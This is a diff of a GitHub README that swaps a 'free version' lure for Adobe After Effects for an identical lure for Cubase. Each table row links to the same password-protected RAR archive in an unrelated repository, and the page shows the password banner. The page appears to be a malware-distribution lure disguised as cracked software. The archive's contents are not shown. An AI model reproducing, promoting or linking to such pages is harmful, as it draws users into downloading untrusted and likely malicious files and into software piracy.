@@ -1,23 +1,20 @@
-# <h1 align=center> AFTER EFFECTS FREE VERSION (NEWEST UPDATE)
-<h2 align=center><a href='https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar'><img src='https://github.com/eptovyi/eptorepo/assets/153016446/8ad2b3da-abba-4e90-8647-e8cfd1d24dd8'></a></h2>
+![cubase](https://github.com/smoritat/smorirepo/assets/153454045/4c194bf2-85c4-473a-8146-859ae2b45c17)# <h1 align=center> CUBASE FREE VERSION (NEWEST UPDATE)
+<h2 align=center><a href='https://github.com/krishgel/krishrepo/releases/download/launcher/KMSbyGitHub_Passwd_2023_LatestVersion.rar'><img src='https://github.com/smoritat/smorirepo/assets/153454045/c632dffa-0b11-4dd9-ae81-cebb132c5853'></a></h2>
 
-# <h1 align=center> DESCRIPTION OF AFTER EFFECTS
-⚫️Adobe After Effects stands as a powerhouse in the realm of motion graphics and visual effects software, recognized for its versatility and innovative tools. Tailored for video editing, animation, compositing, and creating captivating visual effects, After Effects caters to professionals in the film, television, and multimedia industries. With its user-friendly interface and a plethora of advanced features, it stands as an essential tool for both novice and experienced users seeking to bring their creative visions to life.
+# <h1 align=center> DESCRIPTION OF CUBASE
+⚫️Cubase stands as a prominent digital audio workstation (DAW) renowned for its comprehensive set of tools and capabilities in music production, recording, editing, and mixing. Trusted by musicians, producers, and audio engineers worldwide, Cubase offers a versatile platform that caters to the diverse needs of music creators across various genres and styles.
 
-⚫️One of the prominent features of After Effects is its comprehensive set of animation and compositing tools. The software offers a wide array of keyframe-based animation controls, allowing users to create stunning motion graphics and intricate visual effects. Its robust compositing capabilities enable the seamless integration of various elements, such as images, videos, text, and effects, into a unified and visually appealing composition.
+⚫️One of the standout features of Cubase is its advanced audio recording and editing tools. The software provides a powerful recording environment equipped with high-quality audio processing capabilities, enabling users to capture and edit audio with precision. Its intuitive interface allows for seamless multitrack recording, comprehensive audio editing, and manipulation of sound elements to achieve desired results.
 
-⚫️Additionally, Adobe After Effects provides an extensive collection of effects and presets, empowering users to enhance and stylize their creations. From color correction and visual effects to simulated particles and motion tracking, the software offers a vast library of effects to elevate the quality and impact of visual content.
+⚫️Furthermore, Cubase's robust MIDI capabilities set it apart in the realm of music production. The software offers an extensive suite of MIDI editing tools, allowing users to compose, edit, and arrange musical ideas with ease. From composing melodies to intricate arrangements, Cubase empowers musicians to explore creative possibilities through its MIDI functionality.
 
-⚫️Another standout feature of After Effects is its integration with other Adobe Creative Cloud applications. Seamless integration with software like Adobe Premiere Pro and Photoshop streamlines the workflow, allowing for smooth import and export of projects between different applications. This interoperability enhances efficiency and flexibility in creating and editing multimedia content.
+⚫️Moreover, Cubase places a strong emphasis on mixing and post-production capabilities. The software provides a range of professional-grade mixing tools, including advanced channel strips, audio effects, and signal processing options. With features like automation, EQ, compression, and reverbs, users can achieve pristine mixes that meet professional standards.
 
 # <h1 align=center>⚡️ DOWNLOAD LINK⚡️
-| Mod Version| AFTER EFFECTS - Version | Link |
+| Mod Version| CUBASE - Version | Link |
 |----------|-------------|-----------------|
-| v24.7.063 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar) |
-| v24.5.6 | 2023.7.12 & 2023.7.11     | [Download](https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar) |
-| v23.5.4 | 2023.7.12 & 2023.7.11     | [Download](https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar) |
-| v23.2.1 | 2023.7.12 & 2023.7.11     | [Download](https://github.com/eptovyi/eptorepo/releases/download/after-effects/LaunchSetFile_Passwd_2023.rar) |
+| v24.7.063 | 2023.7.12 & 2023.7.11 | [Download](https://github.com/krishgel/krishrepo/releases/download/launcher/KMSbyGitHub_Passwd_2023_LatestVersion.rar) |
+| v24.0.0 | 2023.7.12 & 2023.7.11     | [Download](https://github.com/krishgel/krishrepo/releases/download/launcher/KMSbyGitHub_Passwd_2023_LatestVersion.rar) |
 # <h1 align=center> ✅✅✅PASSWORD - 2023✅✅✅
 
 # <h1 align=center> TURN ALL YOUR IDEAS INTO REALITY!
-
